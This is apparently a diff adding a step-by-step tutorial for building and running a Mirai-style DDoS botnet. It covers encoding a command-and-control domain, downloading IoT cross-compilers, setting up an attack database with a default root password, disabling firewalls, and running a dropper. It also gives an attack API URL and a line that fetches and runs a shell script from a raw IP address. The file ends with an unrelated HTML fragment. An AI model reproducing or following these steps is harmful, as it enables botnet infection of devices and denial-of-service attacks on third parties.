@@ -1,0 +1,141 @@
+// TUT made by zxcr9999
+// using ubuntu 20.04 for better
+
+sudo apt-get update -y
+sudo apt-get upgrade -y
+sudo apt-get install gcc g++ python3 python3-pip electric-fence sudo git nginx screen tftpd tftp xinetd zmap mariadb-server sqlite3 -y
+cd /tmp
+wget https://dl.google.com/go/go1.20.linux-amd64.tar.gz
+sha256sum go1.20.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
+source ~/.bash_profile
+go version
+go env
+cd ~/
+
+// change ip
+dlr/main.c
+loader/src/main.c
+loader/src/headers/config.h
+
+// added domain
+drag file xor.c to ur vps and type command
+gcc xor.c -o xor
+./xor string botnet.yourdomain.com
+and add TABLE_CNC_DOMAIN in table.c file
+"botnet.yourdomain.com" is your domain, and it is connected to the IP to host the botnet
+
+add_entry(TABLE_CNC_DOMAIN, "\xa2\xaf\xa2\xef\xb3\xa0\xbb\xaf\xa4\xb5\xf3\xf1\xf3\xf0\xef\xac\xad", 17);
+
+number 17 will correspond to xor bytes
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i586.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i686.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc-440fp.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2
+wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i486.tar.gz
+
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-i686.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
+tar -jxf cross-compiler-powerpc-440fp.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+tar -xvf cross-compiler-i486.tar.gz
+rm -rf *.tar.*
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-x86_64 x86_64
+
+// Install sql, flow my commands
+sqlite3 data.sql
+
+CREATE TABLE `users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT,`username` TEXT NOT NULL,`password` TEXT NOT NULL,`admin` INTEGER NOT NULL,`reseller` INTEGER NOT NULL,`newuser` INTEGER NOT NULL,`api` INTEGER NOT NULL,`maxtime` INTEGER NOT NULL,`cooldown` INTEGER NOT NULL,`conns` INTEGER NOT NULL,`max_daily` INTEGER NOT NULL,`expiry` INTEGER NOT NULL);
+
+INSERT INTO users VALUES(1,'root','root@123',1,1,0,0,864000,0,3,100,1790903892);
+
+CREATE TABLE `attacks` (`target` TEXT NOT NULL,`duration` INTEGER NOT NULL,`flags` TEXT NOT NULL,`sent` INTEGER NOT NULL,`finish` INTEGER NOT NULL,`user` TEXT NOT NULL,`devices` INTEGER NOT NULL);
+
+.databases
+
+# now we have data.sql, move him to assests/ folder
+
+// Start building
+
+service firewalld stop
+service iptables stop 
+service nginx restart
+service mariadb restart
+
+cd ~/
+chmod 777 *
+bash build.sh
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+cd ~/
+chmod 777 *
+bash dropper.sh
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+screen ./admin
+
+// FAQ
+
+- Using api: http://ip:81/attack?user=root&password=root@123&target=1.1.1.1&duration=60&method=udpthread
+
+- Change bot port and cnc port in assets/server.toml
+
+- If you need help, contact @az369za
+wget http://115.76.19.84:6005/wget.sh && chmod 777 * && ./wget.sh
+
+Login: | Commands: | Attempted Log: 
+
+
+            <div class="col-md-3 col-sm-6" onclick="window.location='clientarea.php?action=addfunds'">
+                <a href="clientarea.php?action=addfunds" class="tile">
+                    <i class="fad fa-credit-card"></i>
+                    <div class="title-info">
+                        <div class="stat">{$clientsstats.creditbalance}</div>
+                    <div class="title">Số Dư</div>
+                    </div>
+                    
+                </a>
+            </div>
